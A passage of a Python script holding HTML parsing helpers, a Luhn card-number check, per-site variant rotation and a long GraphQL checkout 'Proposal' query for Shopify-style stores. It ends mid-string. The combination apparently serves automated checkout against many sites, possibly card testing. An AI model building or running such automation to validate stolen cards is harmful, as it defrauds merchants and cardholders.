    nxt = "full" if _variant_for(host) == "slim" else "slim"
    _SITE_VARIANT[host] = nxt
    return nxt


# ── parsing helpers ─────────────────────────────────────────────────────────
_UUID_RE = re.compile(r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}")


def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            rest = text.split(start, 1)[1]
            if end in rest:
                return rest.split(end, 1)[0] or None
    except Exception:
        pass
    return None


def unescape(text):
    if not text:
        return ""
    out = (text.replace("&quot;", '"').replace("&#34;", '"').replace("&#39;", "'")
                .replace("&amp;", "&").replace("\\u0022", '"').replace("\\u0027", "'")
                .replace('\\"', '"'))
    try:
        import html as _h
        out = _h.unescape(out)
    except Exception:
        pass
    return out


def extract_stable_id(text):
    if not text:
        return None
    raw = unescape(text)
    cands = []
    for src, s, e in ((text, "stableId&quot;:&quot;", "&quot;"),
                      (raw, '"stableId":"', '"'), (raw, 'stableId":"', '"')):
        v = extract_between(src, s, e)
        if v:
            cands.append(v.strip())
    for src in (raw, text):
        for m in re.finditer(r"stableId", src, re.I):
            cands.extend(_UUID_RE.findall(src[m.start():m.start() + 120]))
    seen = set()
    ordered = []
    for c in cands:
        c = c.strip().strip("\\").strip('"').strip("'")
        if c and c not in seen:
            seen.add(c)
            ordered.append(c)
    for c in ordered:
        if _UUID_RE.fullmatch(c):
            return c
    for c in ordered:
        if re.fullmatch(r"[0-9a-fA-F]{32}", c):
            return f"{c[0:8]}-{c[8:12]}-{c[12:16]}-{c[16:20]}-{c[20:32]}".lower()
    return None


def luhn_ok(num):
    digits = [int(d) for d in re.sub(r"\D", "", str(num))]
    if len(digits) < 12:
        return False
    checksum = 0
    parity = len(digits) % 2
    for i, d in enumerate(digits):
        if i % 2 == parity:
            d *= 2
            if d > 9:
                d -= 9
        checksum += d
    return checksum % 10 == 0


def _norm(domain):
    d = domain if domain.startswith("http") else "https://" + domain
    return d.rstrip("/")


def _cache_get(site):
    ent = _SITE_CACHE.get(site)
    if ent and (time.time() - ent[1]) < SITE_CACHE_TTL:
        return ent[0]
    return None


def _cache_set(site, variant):
    _SITE_CACHE[site] = (variant, time.time())


def _deep(obj):
    return json.loads(json.dumps(obj))


# ── GraphQL documents ───────────────────────────────────────────────────────
QUERY_PROPOSAL = (
    "query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,"
    "$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,"
    "$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,"
    "$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,"
    "$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,"
    "$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,"
    "$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,"
    "$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,"
    "$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,"
    "$poNumber:String,$saleAttributions:SaleAttributionsInput){"
    "session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{"
    "alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,"
    "discounts:$discounts,payment:$payment,merchandise:$merchandise,"
    "buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,"
    "availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,"
    "nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,"
    "scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,"
    "optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,"
    "saleAttributions:$saleAttributions},checkpointData:$checkpointData,"
    "queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{"
    "...on NegotiationResultAvailable{checkpointData queueToken "
    "buyerProposal{...BuyerProposalDetails __typename}"
    "sellerProposal{...ProposalDetails __typename}__typename}"
    "...on CheckpointDenied{redirectUrl __typename}"
    "...on Throttled{pollAfter queueToken pollUrl __typename}"
    "...on NegotiationResultFailed{__typename}__typename}"
    "errors{code localizedMessage nonLocalizedMessage localizedMessageHtml"
    "...on RemoveTermViolation{target __typename}"
    "...on AcceptNewTermViolation{target __typename}"
    "...on ConfirmChangeViolation{from to __typename}"
    "...on UnprocessableTermViolation{target __typename}"
    "...on UnresolvableTermViolation{target __typename}"
    "...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}"
    "...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}"
    "__typename}to{...on ApplyChangeValueInt{value __typename}"
    "...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}"
    "__typename}__typename}...on GenericError{__typename}"
    "...on PendingTermViolation{__typename}__typename}__typename}}__typename}}"
    "fragment BuyerProposalDetails on Proposal{buyerIdentity{"
    "...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}"
    "...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}"
    "merchandiseDiscount{...ProposalDiscountFragment __typename}"
    "deliveryDiscount{...ProposalDiscountFragment __typename}"
    "delivery{...ProposalDeliveryFragment __typename}"
    "merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId "
    "merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails"
    "...ContextualizedProductVariantMerchandiseDetails"
    "...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}"
    "quantity{...on ProposalMerchandiseQuantityByItem{items{"
    "...on IntValueConstraint{value __typename}__typename}__typename}__typename}"
    "totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}"
    "__typename}__typename}recurringTotal{title interval intervalCount "
    "recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}"
    "fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}"
    "lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}"
    "components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}"
    "__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode "
    "__typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode "
    "__typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}"
    "__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode "
    "__typename}__typename}__typename}deferredTotal{amount{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}"
    "__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode "
    "__typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping "
    "subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode "
    "__typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "legacyAggregatedMerchandiseTermsAsFees{title description total{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId "
    "__typename}...on DraftOrderAttributions{userIdentifier:userId sourceName "
    "locationIdentifier:locationId __typename}__typename}__typename}"
    "saleAttributions{attributions{...on SaleAttribution{recipient{"
    "...on StaffMember{id __typename}...on Location{id __typename}"
    "...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{"
    "...FilledMerchandiseLineTargetCollectionFragment"
    "...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}"
    "__typename}nonNegotiableTerms{signature contents{signature targetTerms "
    "targetLine{allLines index __typename}attributes __typename}__typename}__typename}"
    "fragment ProposalDiscountFragment on DiscountTermsV2{__typename"
    "...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{"
    "...DiscountLineDetailsFragment __typename}__typename}"
    "...on PendingTerms{pollDelay taskId __typename}"
    "...on UnavailableTerms{__typename}}"
    "fragment DiscountLineDetailsFragment on DiscountLine{allocations{"
    "...on DiscountAllocatedAllocationSet{__typename allocations{amount{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "target{index targetType stableId __typename}__typename}}__typename}"
    "discount{...DiscountDetailsFragment __typename}lineAmount{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "__typename}fragment DiscountDetailsFragment on Discount{"
    "...on CustomDiscount{title description presentationLevel allocationMethod "
    "targetSelection targetType signature signatureUuid type value{"
    "...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem "
    "fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}"
    "__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code "
    "presentationLevel allocationMethod message targetSelection targetType value{"
    "...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem "
    "fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}"
    "__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code "
    "__typename}...on AutomaticDiscount{presentationLevel title allocationMethod message "
    "targetSelection targetType value{...on PercentageValue{percentage __typename}"
    "...on FixedAmountValue{appliesOnEachItem fixedAmount{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "__typename}__typename}__typename}__typename}"
    "fragment ProposalDeliveryFragment on DeliveryTerms{__typename"
    "...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion "
    "shippingRatesStatusToken deliveryLines{destinationAddress{"
    "...on StreetAddress{handle name firstName lastName company address1 address2 city "
    "countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}"
    "...on Geolocation{country{code __typename}zone{code __typename}"
    "coordinates{latitude longitude __typename}postalCode __typename}"
    "...on PartialStreetAddress{name firstName lastName company address1 address2 city "
    "countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}"
    "__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment "
    "__typename}groupType deliveryMethodTypes selectedDeliveryStrategy{"
    "...on CompleteDeliveryStrategy{handle __typename}"
    "...on DeliveryStrategyReference{handle __typename}__typename}"
    "availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom "
    "description code acceptsInstructions phoneRequired methodType carrierName incoterms "
    "brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl "
    "lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{"
    "...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}"
    "minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long "
    "__typename}displayCheckoutRedesign estimatedTimeInTransit{"
    "...on IntIntervalConstraint{lowerBound upperBound __typename}"
    "...on IntValueConstraint{value __typename}__typename}amount{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}"
    "__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 "
    "address2 city countryCode phone postalCode zoneCode __typename}instructions name "
    "__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode "
    "zoneCode postalCode coordinates{latitude longitude __typename}__typename}"
    "businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind "
    "name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}"
    "__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}"
    "...on UnavailableTerms{__typename}}"
    "fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{"
    "linesV2{...on MerchandiseLine{stableId quantity{"
    "...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}"
    "__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}"
    "totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}"
    "__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{"
    "...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}"
    "__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}"
    "totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}"
    "__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId "
    "quantity{...on ProposalMerchandiseQuantityByItem{items{"
    "...on IntValueConstraint{value __typename}__typename}__typename}__typename}"
    "merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "__typename}__typename}__typename}"
    "fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{"
    "...on SourceProvidedMerchandise{__typename requiresShipping}"
    "...on ProductVariantMerchandise{__typename requiresShipping}"
    "...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id "
    "digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval "
    "billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}"
    "__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}"
    "fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename "
    "product{id title productType vendor __typename}productUrl digest variantId "
    "optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard "
    "requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode "
    "__typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})"
    "two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})"
    "__typename}options{name value __typename}properties{...MerchandiseProperties __typename}"
    "taxCode taxesIncluded weight{value unit __typename}sku}__typename}"
    "fragment MerchandiseProperties on MerchandiseProperty{name value{"
    "...on MerchandisePropertyValueString{string:value __typename}"
    "...on MerchandisePropertyValueInt{int:value __typename}"
    "...on MerchandisePropertyValueFloat{float:value __typename}"
    "...on MerchandisePropertyValueBoolean{boolean:value __typename}"
    "...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}"
    "fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId "
    "title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType "
    "__typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})"
    "two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})"
    "__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name "
    "value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}"
    "giftCard __typename}"
    "fragment ContextualizedProductVariantMerchandiseDetails on "
    "ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle "
    "subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor "
    "productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})"
    "two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})"
    "__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name "
    "value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid "
    "subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval "
    "deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode "
    "__typename}__typename}"
    "fragment LineAllocationDetails on LineAllocation{stableId quantity "
    "totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount "
    "currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}"
    "checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{"
    "amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode "
    "__typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit "
    "referenceValue __typename}__typename}allocations{"
    "...on LineComponentDiscountAllocation{allocation{amount{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment "
    "__typename}__typename}__typename}__typename}"
    "fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename "
    "stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails"
    "...ContextualizedProductVariantMerchandiseDetails"
    "...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{"
    "...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}"
    "__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount "
    "currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount "
    "recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}"
    "fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}"
    "fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{"
    "__typename stableId componentCapabilities componentSource merchandise{"
    "...SourceProvidedMerchandise...ProductVariantMerchandiseDetails"
    "...ContextualizedProductVariantMerchandiseDetails"
    "...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{"
    "...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}"
    "__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount "
    "currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount "
    "recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}"
    "fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}"
    "fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment "
    "__typename}deliveryDiscount{...ProposalDiscountFragment __typename}"
    "deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}"
    "availableRedeemables{...on PendingTerms{taskId pollDelay __typename}"
    "...on AvailableRedeemables{availableRedeemables{paymentMethod{"
    "...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount "
    "currencyCode __typename}__typename}__typename}__typename}__typename}__typename}"
    "availableDeliveryAddresses{name firstName lastName company address1 address2 city "
    "countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label "
    "__typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates "
    "progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id "
    "availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company "
    "address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude "
    "__typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}"
    "coordinates{latitude longitude __typename}postalCode __typename}"
    "...on PartialStreetAddress{name firstName lastName company address1 address2 city "
    "countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}"
    "__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}"
    "groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}"
    "__typename}deliveryMethodTypes availableDeliveryStrategies{"
    "...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description "
    "code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key "
    "namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl "
    "darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}"
    "deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode "
    "__typename}__typename}__typename}discountRecurringCycleLimit "
    "excludeFromDeliveryOptionPrice targetMerchandise{"
    "...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime "
    "maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short "
    "long __typename}displayCheckoutRedesign estimatedTimeInTransit{"
    "...on IntIntervalConstraint{lowerBound upperBound __typename}"
    "...on IntValueConstraint{value __typename}__typename}amount{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}"
    "__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 "
    "city countryCode phone postalCode zoneCode __typename}instructions name "
    "distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{"
    "address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude "
    "longitude __typename}__typename}businessHours{day openingTime closingTime __typename}"
    "carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator "
    "__typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}"
    "__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode "
    "__typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount "
    "currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long "
    "__typename}deliveryStrategyHandles id title totalTitle __typename}__typename}"
    "...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}"
    "payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{"
    "...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex "
    "displayName extensibilityDisplayName availablePresentmentCurrencies "
    "paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields "
    "alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename "
    "paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice "
    "availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier "
    "name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{"
    "...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename "
    "availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier "
    "paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}"
    "orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}"
    "...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow "
    "paymentIntent paymentMethodIdentifier orderingIndex clientToken}"
    "...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier "
    "orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes "
    "maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}"
    "supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed "
    "ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}"
    "...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers "
    "acquirerCountryCode mode paymentMethodIdentifier orderingIndex}"
    "...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken "
    "walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}"
    "...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway "
    "gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}"
    "...on AmazonPayClassicWalletConfig{__typename name orderingIndex}"
    "...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName "
    "additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label "
    "value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename "
    "additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name "
    "availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails "
    "paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies "
    "__typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions "
    "paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}"
    "...on DeferredPaymentMethod{orderingIndex displayName __typename}"
    "...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name "
    "orderingIndex...CustomerCreditCardPaymentMethodFragment}"
    "...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail"
    "...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{"
    "...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company "
    "address1 address2 city countryCode zoneCode postalCode phone __typename}"
    "...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id "
    "translatedName dueDate dueInDays type __typename}depositConfiguration{"
    "...on DepositPercentage{percentage __typename}__typename}__typename}"
    "...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}"
    "poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId "
    "merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails"
    "...ContextualizedProductVariantMerchandiseDetails"
    "...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{"
    "...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}"
    "__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount "
    "currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount "
    "recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}"
    "fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}"
    "lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}"
    "components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}"
    "__typename}__typename}note{customAttributes{key value __typename}message __typename}"
    "scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges "
    "shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{"
    "...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode "
    "market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone "
    "postalCode city company zoneCode countryCode label __typename}__typename}"
    "...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode "
    "market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing "
    "ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 "
    "phone postalCode city company zoneCode countryCode label __typename}__typename}"
    "shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode "
    "city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id "
    "balance{amount currencyCode __typename}__typename}__typename}"
    "...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress "
    "__typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing "
    "acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount "
    "phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{"
    "locationCount __typename}location{id externalId name billingAddress{firstName lastName "
    "address1 address2 phone postalCode city company zoneCode countryCode label __typename}"
    "shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode "
    "countryCode label __typename}__typename}__typename}phone email marketingConsent{"
    "...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}"
    "__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget "
    "recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}"
    "fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}"
    "subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode "
    "__typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "legacyAggregatedMerchandiseTermsAsFees{title description total{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "__typename}legacyRepresentProductsAsFees totalSavings{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}"
    "__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}"
    "__typename}__typename}checkoutTotalBeforeTaxesAndShipping{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}"
    "__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode "
    "__typename}__typename}__typename}deferredTotal{amount{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}"
    "__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}"
    "__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount "
    "currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}"
    "__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}"
    "...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}"
    "__typename}__typename}totalAmountIncludedInTarget{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}"
    "__typename}__typename}...on PendingTerms{pollDelay __typename}"
